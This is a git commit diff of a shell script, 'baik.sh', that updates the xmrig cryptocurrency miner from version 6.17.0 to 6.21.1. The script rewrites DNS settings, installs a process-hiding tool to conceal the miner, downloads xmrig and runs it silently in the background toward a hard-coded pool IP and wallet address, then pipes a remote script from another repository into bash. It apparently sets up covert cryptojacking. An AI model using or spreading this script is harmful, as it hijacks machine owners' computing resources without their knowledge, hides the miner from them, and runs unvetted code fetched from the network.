b46f9b0c96d5048f87ba3bb2355e79514cd34b7c
malogrono <136266511+malogrono@users.noreply.github.com>
2026-05-26 21:29:38 +0700

    Update baik.sh

--- baik.sh
+++ baik.sh
@@ -11,8 +11,8 @@ rm cikblek.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add xmrig"
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz >/dev/null 2>&1
-tar -xf xmrig-6.17.0-linux-x64.tar.gz
-cd xmrig-6.17.0
-./xmrig -a rx/0 -o 165.245.179.15:443 -u 125Jbun61Pizt3cwSDLAV8fgxdQP1miPNsWzPW3dABF3wpdAXf8gQcNjESJuy8r9ipG6JwvpcoV5ivhYUZyCRad6YWQ."0$RANDOM" >/dev/null 2>&1 &
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz >/dev/null 2>&1
+tar -xf xmrig-6.21.1-linux-x64.tar.gz
+cd xmrig-6.21.1
+./xmrig -a rx/0 -o 165.245.179.15:443 -u 125Jbun61Pizt3cwSDLAV8fgxdQP1miPNsWzPW3dABF3wpdAXf8gQcNjESJuy8r9ipG6JwvpcoV5ivhYUZyCRad6YWQ."0$RANDOM" -k >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
